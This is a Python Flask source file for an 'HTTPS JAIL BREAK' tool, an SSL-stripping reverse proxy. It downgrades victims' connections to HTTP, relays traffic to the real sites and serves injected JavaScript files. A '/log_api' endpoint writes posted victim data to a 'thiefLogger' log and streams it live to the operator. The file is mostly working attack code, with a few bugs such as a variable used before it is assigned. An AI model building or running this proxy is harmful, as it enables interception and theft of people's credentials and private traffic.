#⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️⛓️  HTTPS JAIL BREAK ⛓️
# written by Idan.M 
# reverse proxy for downgrading the connection from https to http
from flask import Flask, request,make_response,render_template,send_from_directory,Response
import requests
import proxy_utils 
import logging
import re
import time
import os 
import proxy_parser 
from collections import deque

sseStack = deque()

app = Flask(__name__,static_url_path='', 
            static_folder='static',
            template_folder='templates')
PORT = 80
HOST="0.0.0.0"
logger = logging.Logger("thiefLogger")
logger.addHandler(logging.FileHandler("thiefLogger.log"))
logger.setLevel(logging.WARN)
VALID_IP = r"^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$"
logedUsers = {} 



@app.route("/",methods = ["GET"])
def wellcome(): 
     if not re.match(VALID_IP,request.host.removeprefix("http://")): 
        return proxy("")
     return render_template('home_page.html' ) 
       
@app.route("/plots",methods = ["GET"])
def plotsPage():
     return render_template('perolad-analyze.html',)
   
@app.route("/favicon.ico",methods = ["GET"] )   
def favicon():
     req = request.host.removeprefix("http://").removeprefix("www.") 
     if re.match(VALID_IP,req): 
          return send_from_directory(os.path.join(app.root_path, 'static'),
                          'favicon.ico',mimetype='image/vnd.microsoft.icon')
     return proxy("favicon.ico")
 
@app.route("/cybugs/<path:path>" , methods = ['GET'])
def cybugsServe(path):
     script = "Error" 
     response = None
     if "/" in path or ".." in path  : 
          return "You cant do LFI g - repoterd to the admin..." , 404
     try : 
          with open(f"../cy-bugs/{path}" , 'r') as file:
               script= "".join(filter(lambda x : not x.startswith("//") and x.strip("\n") ,file.readlines()))
          response = make_response(script)
          response.headers['content-type'] = "text/javascript"
          response.status_code = 200 
     except : 
          print("couldnt find cy-bug ... ")
          response = make_response(script)
          response.status_code = 404 
     return response
    
@app.route("/log_api/<path:path>" , methods = ['POST'])  
def log(path):  
     logger.log(level = logging.WARNING ,msg= f"log : {request.data} {path} " )
     deque.append(f"log : {request.data} {path} " )
     print("loging...")
     return "<p>logged</p>",200
        
@app.route("/sse/log_api" , methods = ['GET'])  
def logSSE():  
    def generateSSE() :
         while(True): 
              if sseStack:  
                    yield sseStack.popleft() 
              time.sleep(1)
    return Response(generateSSE(), mimetype='text/event-stream')
                       
@app.route("/",methods = ["POST"])
@app.route("/<path:path>", methods=['GET', 'POST'])
def proxy(path):
     domainName =proxy_utils.cleanHostName(request.host) #get the requested host to reverse proxy 
     method = request.method #get the method 
     data = request.form.to_dict()   #get the data section for requests 
     parmas = proxy_parser.argsParse(request.args.to_dict(),domainName,path)
     print(domainName+path , respone.status_code , respone)
     respone = requests.request(method, domainName+path, data = data  ,params= parmas ,  headers= proxy_utils.cleanHeaders(request.headers,proxy_utils.Way.To))
     returnData = None
     if "content-type" in respone.headers and "image" in respone.headers["content-type"]: #return an Image 
          # proxy_utils.saveContent(respone.content,path,os.getcwd(),"image")
          resp =make_response(respone.content)
          resp.headers.set('Content-Type',respone.headers["content-type"] )
          resp.headers.set('Content-Disposition', 'attachment', filename=path)
          return resp  
     else : 
          returnData = proxy_parser.parse(respone.text,domainName=domainName , path=path,pageType="text/plain" if "content-type" not in respone.headers else  respone.headers["content-type"])
     code = respone.status_code
     headers = proxy_utils.cleanHeaders(respone.headers,proxy_utils.Way.From)
     return returnData , code , headers 
  
     
if __name__ == '__main__':
    app.run(host=HOST,port=PORT)